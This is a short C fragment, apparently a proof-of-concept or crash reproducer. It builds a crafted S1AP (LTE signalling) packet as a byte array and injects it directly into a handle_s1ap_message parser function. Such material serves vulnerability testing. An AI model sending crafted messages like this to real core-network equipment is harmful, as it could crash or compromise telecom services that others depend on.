...
{
    char packet_bytes[] = {
        0x00, 0x11, 0x00, 0x34, 0x00, 0x00, 0x04, 0x00,
        0x00, 0x11, 0x00, 0x34, 0x00, 0x00, 0x04, 0x00,
        0x3b, 0x00, 0x08, 0x00, 0x09, 0xf1, 0x65, 0x00,
        0x00, 0x00, 0x40, 0x00, 0x3c, 0x40, 0x11, 0x07,
        0x00, 0x41, 0x63, 0x63, 0x65, 0x6c, 0x6c, 0x65,
        0x72, 0x61, 0x6e, 0x2d, 0x48, 0x31, 0x30, 0x31,
        0x00, 0x40, 0x00, 0x07, 0x00, 0x00, 0x01, 0x00,
        0x09, 0xf1, 0x65, 0x00, 0x89, 0x40, 0x01, 0x40
    };
    char *pkt = malloc(200);
    memcpy(pkt, packet_bytes, sizeof(packet_bytes));
    printf("inject crafted message\n");
    handle_s1ap_message((void *)pkt);
}
